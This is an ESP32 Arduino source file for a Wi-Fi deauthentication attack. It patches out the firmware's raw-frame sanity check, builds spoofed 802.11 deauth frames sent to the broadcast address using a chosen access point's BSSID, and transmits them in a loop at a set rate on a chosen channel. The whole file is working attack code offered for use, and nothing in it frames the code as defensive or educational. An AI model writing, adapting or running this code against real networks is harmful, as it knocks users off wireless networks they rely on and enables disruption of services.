#include <Arduino.h>
#include <string.h>
#include <stdlib.h>
#include "esp_wifi.h"
#include "deauth.h"

// ===== Hack to bypass sanity check ======
extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) {
  return 0;
}

// ===== Global Config =====
static bool deauth_wifi_initialized = false;

// Global variable definitions
int packets = 25;  // packets per second
uint8_t source_mac_global[6];
uint8_t target_mac_global[6];
int attack_channel = 1;
bool deauth_active = false;

// Broadcast destination (deauth to everyone)
const uint8_t broadcast_mac[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };

// IEEE 802.11 Deauthentication packet (26 bytes)
uint8_t deauth_frame[26];

// ===== Convert MAC string to byte array =====
void macStringToBytes(const char* macStr, uint8_t* bytes) {
  for (int i = 0; i < 6; i++) {
    bytes[i] = strtoul(macStr, NULL, 16);
    macStr = strchr(macStr, ':');
    if (macStr) macStr++;
  }
}

// ===== Initialize WiFi for raw TX =====
void init_raw_wifi() {
  if (deauth_wifi_initialized) return;

  Serial.println("Initializing WiFi for raw transmission...");

  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_STA);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);

  // Set channel to attack_channel
  esp_wifi_set_channel(attack_channel, WIFI_SECOND_CHAN_NONE);

  deauth_wifi_initialized = true;
  Serial.println("Raw WiFi initialized");
}

// ===== Setup Deauth Frame (byte array version) =====
void setup_deauth(const uint8_t* source_bssid, const uint8_t* target_bssid, int channel, int pps) {
  packets = pps;
  attack_channel = channel;

  // Copy MAC addresses to global variables
  memcpy(source_mac_global, source_bssid, 6);
  memcpy(target_mac_global, target_bssid, 6);

  // --- Construct Deauth Packet ---
  // Frame Control
  deauth_frame[0] = 0xC0;  // Type/Subtype: Deauth (0xC0)
  deauth_frame[1] = 0x00;  // Flags

  // Duration
  deauth_frame[2] = 0x00;
  deauth_frame[3] = 0x00;

  // Destination Address (Broadcast)
  memcpy(&deauth_frame[4], broadcast_mac, 6);

  // BSSID (STA BSSID)
  memcpy(&deauth_frame[10], target_bssid, 6);

  // Source Address (AP BSSID)
  memcpy(&deauth_frame[16], source_bssid, 6);

  // Sequence Control
  deauth_frame[22] = 0x00;
  deauth_frame[23] = 0x00;

  // Reason Code (0x0007 = Class 3 frame received from non-associated STA)
  deauth_frame[24] = 0x07;
  deauth_frame[25] = 0x00;

  init_raw_wifi();

  deauth_active = true;
}

// ===== Setup Deauth Frame (string version) =====
void deauth_setup(const char* source_bssid_str, const char* target_bssid_str, int channel, int pps) {
  uint8_t source_mac[6];
  uint8_t target_mac[6];

  macStringToBytes(source_bssid_str, source_mac);
  macStringToBytes(target_bssid_str, target_mac);

  setup_deauth(source_mac, target_mac, channel, pps);
}

// ===== Send Deauth Packet =====
void deauth_loop() {
  if (deauth_active) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
    delay(1000 / packets);
  }
}

// ===== Stop Deauth =====
void stop_deauth() {
  deauth_active = false;
  Serial.println("Deauth stopped");
}